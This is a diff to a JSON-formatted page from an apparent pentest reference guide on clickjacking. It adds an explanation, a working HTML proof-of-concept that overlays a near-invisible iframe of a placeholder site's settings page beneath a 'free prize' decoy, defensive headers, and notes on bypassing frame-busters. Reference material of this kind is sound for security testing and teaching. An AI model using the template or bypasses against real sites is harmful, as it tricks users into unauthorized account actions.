@@ -12,43 +12,90 @@
     ],
     "sections": [
         {
-            "heading": "General",
-            "type": "paragraph",
-            "content": "{% hint style=\"info\" %}\nClickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.\n Preventions:\n X-Frame-Options: deny/sameorigin/allow-from\n* CSP: policy/frame-ancestors 'none/self/domain.com'\n{% endhint %}\n``markup\n# An example using the style tag and parameters is as follows:\n\n#targetwebsite {\nposition:relative;\nwidth:128px;\nheight:128px;\nopacity:0.00001;\nz-index:2;\n}\n#decoywebsite {\nposition:absolute;\nwidth:300px;\nheight:400px;\nz-index:1;\n}\n\n...\n\n...decoy web content here...\n\n``"
+            "type": "hint",
+            "variant": "info",
+            "content": "Clickjacking (UI Redressing) is an interface-based attack where a user is tricked into clicking on actionable content on a hidden website by clicking on decoy content. \n\n**Impact:** Unauthorized actions such as deleting accounts, making purchases, or changing security settings without the user's knowledge."
+        },
+        {
+            "heading": "PoC Template",
+            "type": "code_block",
+            "content": [
+                "<html>",
+                "    <head>",
+                "        <style>",
+                "            #targetwebsite {",
+                "                position: relative;",
+                "                width: 1280px;",
+                "                height: 720px;",
+                "                opacity: 0.1; /* Set to 0.00001 for real attack */",
+                "                z-index: 2;",
+                "            }",
+                "            #decoywebsite {",
+                "                position: absolute;",
+                "                width: 300px;",
+                "                height: 400px;",
+                "                z-index: 1;",
+                "            }",
+                "        </style>",
+                "    </head>",
+                "    <body>",
+                "        <div id=\"decoywebsite\">",
+                "            <h1>Click here for a free prize!</h1>",
+                "        </div>",
+                "        <iframe id=\"targetwebsite\" src=\"https://vulnerable-website.com/settings\"></iframe>",
+                "    </body>",
+                "</html>"
+            ]
+        },
+        {
+            "heading": "Defense Mechanisms",
+            "type": "code_block",
+            "content": [
+                "# 1. X-Frame-Options (XFO)",
+                "X-Frame-Options: DENY          # Cannot be framed by anyone",
+                "X-Frame-Options: SAMEORIGIN    # Can only be framed by same origin",
+                "",
+                "# 2. Content Security Policy (CSP)",
+                "Content-Security-Policy: frame-ancestors 'none';           # Equivalent to DENY",
+                "Content-Security-Policy: frame-ancestors 'self';           # Equivalent to SAMEORIGIN",
+                "Content-Security-Policy: frame-ancestors 'self' *.trusted.com;",
+                "",
+                "# 3. SameSite Cookie Attribute",
+                "Set-Cookie: session=xyz; SameSite=Lax;     # Prevents cookie being sent in cross-site frames",
+                "Set-Cookie: session=xyz; SameSite=Strict;  # Most secure against clickjacking"
+            ]
+        },
+        {
+            "heading": "Bypassing Frame-Busters",
+            "type": "code_block",
+            "content": [
+                "# HTML5 Sandbox attribute bypass",
+                "<iframe sandbox=\"allow-forms\" src=\"...\"></iframe>",
+                "",
+                "# Double-framing technique",
+                "# Attacker -> Decoy (unrestricted) -> Vulnerable (restricted)",
+                "",
+                "# XSS to Clickjacking",
+                "# If the site has XSS, you can use it to remove frame-busting scripts dynamically."
+            ]
         }
     ],
     "images": [
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2020-09-09T06:04:06.104Z",
+        "last_updated": "2026-04-22T17:58:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/clickjacking.md",
         "previous_page": {
-            "title": "Broken Links",
-            "url": "/enumeration/web/broken-links"
+            "title": "Web Cache Poisoning",
+            "url": "/enumeration/web/web-cache-poisoning"
         },
         "next_page": {
-            "title": "HTTP Request Smuggling",
-            "url": "/enumeration/web/request-smuggling"
+            "title": "Broken Links",
+            "url": "/enumeration/web/broken-links"
         }
     }
 }
